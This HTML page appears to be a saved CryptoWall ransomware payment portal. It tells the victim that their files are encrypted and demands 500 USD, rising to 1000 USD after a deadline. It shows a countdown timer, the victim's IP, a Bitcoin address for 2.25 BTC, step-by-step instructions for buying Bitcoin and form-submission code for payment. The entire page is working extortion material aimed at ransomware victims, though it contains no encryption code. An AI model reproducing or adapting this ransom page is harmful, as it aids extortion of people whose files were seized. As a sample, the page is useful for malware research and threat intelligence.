
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
  <title>
  Decrypt service  </title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
  <link rel="stylesheet" href="img/style.css" type="text/css"/>
  <script type="text/javascript">(function h_hide(n){var hd=document.getElementById("tor2web-header");n++;if(hd)hd.style.display="none"; else if(n<15)setTimeout(function(){h_hide(n)},500);})(0)</script>
  <script type="text/javascript">
    window.onerror = function (errorMsg, url, lineNumber) { return true; }
    function dge(name){return document.getElementById(name);}
    function show(name){var nt;if (typeof name == 'string')nt = dge(name);else nt = name;nt.style.display = 'block';return true;}
    function hide(name){var nt;if (typeof name == 'string')nt = dge(name);else nt = name;nt.style.display = 'none';return true;} 
    function write_msg(msg){var info_msg = dge('info_msg');var info_msg_text = dge('info_msg_text');if (info_msg && info_msg_text){info_msg_text.innerHTML = msg;show(info_msg);}}
    function reload_page(){var td=dge('testdecrypt_button');if (td)td.click();}
    var sprintf=new function(){var f=['toString','toUpperCase','toLowerCase','toFixed','toExponential','toPrecision','fromCharCode','length'],
    formats={
	     '%':function(v){return'%'},
	     'b':function(v){return(+v)[f[0]](2)},
	     'c':function(v){return String[f[6]](+v)},
	     'C':function(v){return String[f[6]](+v)[f[1]]()},
	     'd':function(v){return(+v)?+v:0},
	     'e':function(v){return(+v)[f[4]]()[f[0]]()},
	     'E':function(v){return(+v)[f[4]]()[f[1]]()},
	     'f':function(v,p){return(+v)[f[3]](p)},
	     'F':function(v,p){return(+v)[f[3]](p)},
	     'g':function(v,p){return((+v)[f[5]](p)[f[0]]()[f[7]]<(+v)[f[4]]()[f[0]]()[f[7]]?(+v)[f[5]](p):(+v)[f[4]]())[f[0]]()},
	     'G':function(v,p){return((+v)[f[5]](p)[f[0]]()[f[7]]<(+v)[f[4]]()[f[0]]()[f[7]]?(+v)[f[5]](p):(+v)[f[4]]())[f[1]]()},
	     'o':function(v){return(  +v)[f[0]](8)},
	     's':function(v){return(''+v)[f[0]]()},
	     'S':function(v){return(''+v)[f[1]]()},
	     'u':function(v){return Math.abs(+v)},
	     'x':function(v){return(  +v)[f[0]](16)[f[2]]()},
	     'X':function(v){return(  +v)[f[0]](16)[f[1]]()}
	    },
	    format=function(d){var i=0;return function(m,a,b,s,w,p,n,f){var r=''+formats[f]((typeof d[i]=='object')?d[(d.length==1)?i:i++][n]:d[(d.length==1)?i:i++],p);if(r=="%"&&d.length!=1)i--;if(a)b=a;while(b&&b.length&&r.length<+w)r=(s=="-")?(r+b):(b+r);return r}},

	    re=new RegExp('%(?:(?:[\'\"](.)|([0 ]))?([+-])?(\\d+)?(?:\\.(\\d+))?(?:\\(([^)]+)\\))?)([%bcCdeEfFgGosSuxX])','g');
	    return function(s){return s.replace(re,format(Array.apply(null,arguments).slice(1)))};
    };

    function back_timer(id, backtime)
      {
      var dwatch = document.getElementById(id);
      if (dwatch)
	{
        var hours = sprintf("%02d", Math.floor(backtime/3600));
        var minutes = sprintf("%02d", Math.floor((backtime - 3600*Math.floor(backtime/3600))/60));
        var seconds = sprintf("%02d", backtime - 60*Math.floor((backtime - 3600*Math.floor(backtime/3600))/60) - 3600*Math.floor(backtime/3600));
        dwatch.innerHTML = "<b>" + hours + "</b><font color=black>h</font> <b>" + minutes + "</b><font color=black>m</font> <b>" + seconds + "</b><font color=black>s</font>";
        if (backtime > 0) { setTimeout("back_timer('"+id+"',"+(backtime-1)+")", 1000); }
	}
      }
  </script>
  </head>


<body style="width:100%;" onload="back_timer('back_timer', 602043)"> 
<div id="info_msg" class="bradius info_msg" style="">
<div id="info_msg_text"></div><center><br><input type="button" class="abutton" value="Close message" onclick="document.getElementById('info_msg').style.display = 'none'"></center>
</div>

<div id="maindiv" class="maindiv" style="width:100%" align=center valign=middle>    
<table border=0 style="width:850px; margin-top:20px;" cellspacing=0 cellpadding=0>
<tr><td class="angle bltpng"></td>
<td class="bwhite"></td>
<td class="angle brtpng"></td>
</tr>
<tr><td class="bwhite"></td>
<td class="bwhite" valign="top">
<div id="decrypt" class="s13" style="font-family:Arial; font-size:15px; color:#1a175f; text-align:center;">
<span style="color:#550000; line-height:20px;">


<b>Your files are encrypted.</b><br> To get the key to decrypt files you have to pay <b class="selka">500 USD</b>. If payment is not made ​​before <b class="selka">06/09/15 </b> the cost of decrypting files will increase 	<b class="selka">2</b> times and will be <b class="selka">1000 USD</b>	<div style="padding-top:10px; line-height:22px;">	Prior to increasing the amount left:
<br><span id="back_timer"></span></div></span><hr><div id="machine_info" style="position:relative; font-family:inherit; font-size:12px; color:#222222; margin-top:5px;">

<!---Your system: <font color=green>Windows 8.1</font> (<font color=green>x64</font>) &nbsp;&nbsp; -->
First connect IP: <font color=green>66.187.73.162</font> 
&nbsp;&nbsp; </div>

</div></td>
<td class="bwhite"></td></tr><tr><td class="angle blbpng"></td>	  <td class="bwhite"></td> <td class="angle brbpng"></td></tr>   </table>
 <div style="">
	 <form method="POST" return false;">
	  <input type="hidden" id="page" name="page" value="">
	  <input type="submit" class="just_button" value="Refresh" onclick="dge('page').value='index'">
      <input type="submit" class="just_button" style="font-weight:bold; color:green;" value="Payment" onclick="dge('page').value='index'">
	  <input type="submit" class="just_button" value="FAQ" onclick="dge('page').value='faq'">
	  <input type="submit" class="just_button" style="font-weight:bold; color:green;" value="Decrypt 1 file for FREE" onclick="dge('page').value='testdecrypt'" id="testdecrypt_button">
	  <input type="submit" class="just_button" value="Support" onclick="dge('page').value='support'">
	</form>
    </div>
<div class="bradius" style="display:none; position:fixed; z-index:100; width:500px; height:30px; top:200px; left:50%; margin-left:-250px; color:#FFFFFF; font-weight:bold; font-size:14px; border-width:2px; border-color:#FA4343; background:#800000;">
	You have entered an invalid check number or transaction ID
</div>

<table border=0 style="width:850px; margin-top:0px; margin-bottom:20px;" cellspacing=0 cellpadding=0>
<tr><td class="angle bltpng"></td>
<td class="bwhite"></td>
<td class="angle brtpng"></td>
</tr>

<tr><td class="bwhite"></td>
<td class="bwhite" valign="top">
<div id="decrypt" class="s13" style="text-align:center;">
<center>
<script type="text/javascript">
var payment_type = {'moneypak':1, 'paysafecard':2, 'bitcoin':3, 'litecoin':4, 'ukash':5}

function check_pay_info(draft_type)
 {
   var payment_form = dge('payment_form');
   if (!payment_form)
	{
	write_msg('Error on payment');
	return false;
	}
   var draft_number_elm = dge('code_'+draft_type);
   var draft_currency_elm = dge('currency_'+draft_type);
   if (!draft_number_elm)
	{
	write_msg('Error: code input or currency input not found');
	return false;
	}
   var draft_number = draft_number_elm.value;
   if (draft_number.length < 10)
	{
	write_msg('You have entered an invalid check number or transaction ID');
	return false;
	}
    var draft_currency = 0;
    if (draft_currency_elm)
	{
        draft_currency = draft_currency_elm.value;
        if (draft_currency.length < 1)
	  {
	  write_msg('Error: draft currency is invalid');
	  return false;
	  }
	}
   if (payment_type)
	{
	var d_type = payment_type[draft_type];
	payment_form.do_pay.value = '1';
	payment_form.draft_number.value = draft_number;
	payment_form.draft_type.value = d_type;
	payment_form.draft_currency.value = draft_currency;
	payment_form.submit();
	}
      return true;
}
function openEx(url)
{
  w = window.open();
  w.document.write('<meta http-equiv="refresh" content="0;url='+url+'">');
  w.document.close();
  return false;
}
</script>



<center><div style="font-size:13px; line-height:20px; margin-bottom:10px;">
We are presenting a special software - CryptoWall Decrypter - which allows to decrypt and return control to all your encrypted files.<br><b>How to buy CryptoWall decrypter?</b></div></center>

<div style="width:700px; margin-top:5px; margin-bottom:20px; text-align:left; border-style:solid; border-width:15px; border-color:#EEEEEE; padding:10px;">
<form id="payment_form" action="" method="POST">
	<input type="hidden" name="do_pay" value="0">
	<input type="hidden" name="draft_number" value="">
	<input type="hidden" name="draft_type" value="">
	<input type="hidden" name="draft_currency" value="">
	<input type="hidden" name="draft_simple_amount" value="">
 </form>

<div id="bitcoin_info" class="s13" style="margin-top:10px;">

<div class="man_step"><font color=red>1.</font> You can make payment by PayPal My Cash Cards(1000$, <a target=_blank href="instr.html">click here</a>), or with BitCoins(~500$, see instructions below) </div><p>
<p>
</p>
<center><img src="img/bitcoin.png" border="0"></center><br>

<div class="man_step"><font color=red>2.</font> You should register Bitcon wallet ( <a href="#" onclick="return openEx('http://www.wikihow.com/Create-an-Online-Bitcoin-Wallet');">click here for more information with pictures</a>)</div> </div>
<br>
<div class="man_step"><font color=red>3.</font> Purchasing Bitcoins - Although it`s not yet easy to buy bitcoins, it`s getting simpler every day. </div>
<div style="margin-left:20px; margin-top:5px;">

	<b><i>Here are our recommendations:</i></b>
    <ul style="margin-top:4px;">
	<li><a href="#" onclick="return openEx('https://localbitcoins.com/buy-bitcoins-online/usd/western-union/');">LocalBitcoins.com (WU)</a> - Buy Bitcoins with Western Union</li>
	<li><b><a href="#" onclick="return openEx('https://coincafe.com');">Coincafe.com</a> - Recommended for fast, simple service. Payment Methods: Western Union, Bank of America,Cash by FedEx, Moneygram, Money Order. In NYC: Bitcoin ATM, In Person</b></li>
	<li><a href="#" onclick="return openEx('https://localbitcoins.com/');">LocalBitcoins.com</a> - Service allows you to search for people in your community willing to sell bitcoins to you directly.</li>
	<li><a href="#" onclick="return openEx('https://btcdirect.eu/');">btcdirect.eu</a> - THE BEST FOR EUROPE</li>
	<li><a href="#" onclick="return openEx('https://coinrnr.com/');">coinrnr.com</a> - Another fast way to buy bitcoins</li>
	<li><a href="#" onclick="return openEx('http://bitquick.co/');">bitquick.co</a> - Buy Bitcoins Instantly for Cash</li>
	<li><a href="#" onclick="return openEx('http://howtobuybitcoins.info/');">How To Buy Bitcoins</a> - An international directory of bitcoin exchanges.</li>
	<li><a href="#" onclick="return openEx('https://cashintocoins.com/');">Cash Into Coins</a> - Bitcoin for cash.</li>
	<li><a href="#" onclick="return openEx('https://www.coinjar.com/buy_bitcoins');">CoinJar</a> - CoinJar allows direct bitcoin purchases on their site.</li>
	<li><a href="#" onclick="return openEx('https://anxpro.com/');">anxpro.com</a></li>
	<li><a href="#" onclick="return openEx('https://bittylicious.com/');">bittylicious.com</a></li>
	<li><a href="#" onclick="return openEx('http://zipzapinc.com/');">ZipZap</a> - ZipZap is a global cash payment network enabling consumers to pay for digital currency.</li>
	</ul>
	</div>
<br>
   <div class="man_step">
  <font color=red>4.</font> Send  <b>
 
  <input type="text" class="amount" value=" 2.25 " name="amount_bitcoin" readonly> BTC</b> to Bitcoin address: 
  <input type="text" class="coin_address" value=" 13gBB7mbKgJF2GQkaUMM6W67Z44fnHbYKs " name="bitcoin_address" readonly>


</div>
 
  <br>

  <div class="man_step" style="margin-bottom:5px;">
  <font color=red>5.</font>  Enter the Transaction ID and chose payment option: </div>
  
  <input type="text" id="code_bitcoin" class="inputcode" maxlength="70" style="width:420px; height:22px;"> 
   <select id="currency_bitcoin" class="inputcurrency">
   <option value="500">2.25 BTC ~= 500 USD </option>

<option value="1000">PayPal MyCash</option>  

  </select> 
  <input type="button" class="clear_button" value="Clear" onclick="input_reset('code_bitcoin');">
  <br>
  &nbsp;<font style="font-size:12px;"><b>Note:</b> Transaction ID - you can find in detailed info about transaction you made.<br> (example 44214efca56ef039386ddb929c40bf34f19a27c42f07f5cf3e2aa08114c4d1f2)</font><br><br>

  <div class="man_step">
  <font color=red>6.</font> Please check the payment information and click "PAY". </div><br><br>

  <div style="text-align:center;">
 

     <input type="button" class="button_pay" value=" PAY " onclick="check_pay_info('bitcoin');" onmouseover="this.className='button_pay_sel'" onmouseout="this.className='button_pay'">


  </div>
 </div>
</div>



</div>
</center><center>
<div  class="drafts" style="padding-top:3px; padding-bottom:3px; background:#4C4441; color:#EFEFEF; font-size:14px; font-weight:bold;">
Your sent drafts</div></center><center>
<div id="drafts_info" style="position:relative;">
<table border=0 class="drafts" style="font-size:12px;" cellspacing=0 cellpadding=0><tr style="background:#4C4441; color:#EFEFEF">
<td class="tdpad" style="width:45px;">Num</td>
<td class="tdpad" style="width:130px;">Draft type</td>
<td class="tdpad">Draft number or transaction ID</td>
<td class="tdpad" style="width:70px;">Amount</td>
<td class="tdpad" style="width:130px;">Status</td>

<tr><td class="tdpad" style="width:40px"></td><td class="tdpad"></td><td class="tdpad" ><input type="text" style="color:red; border-style:solid; border-width:0px; text-align:center; width:100%;" value="Your payments not found." readonly></td><td class="tdpad" ></td><td class="tdpad"></td></table></center><br><center><div style="width:700px; padding:3px; border-style:solid; border-width:4px; border-color:#E5E5E5;"><b> 0 </b> valid drafts are put, the total amount of <b> 0 </b> USD. 

 <font color="#770000"> </font></div></center><br><br>	    </div>
	  </td>
	  <td class="bwhite"></td>
	</tr>
	<tr><td class="angle blbpng"></td>
	  <td class="bwhite"></td>
	  <td class="angle brbpng"></td>
</tr>

      </table>

    </div>

  </body>

</html>

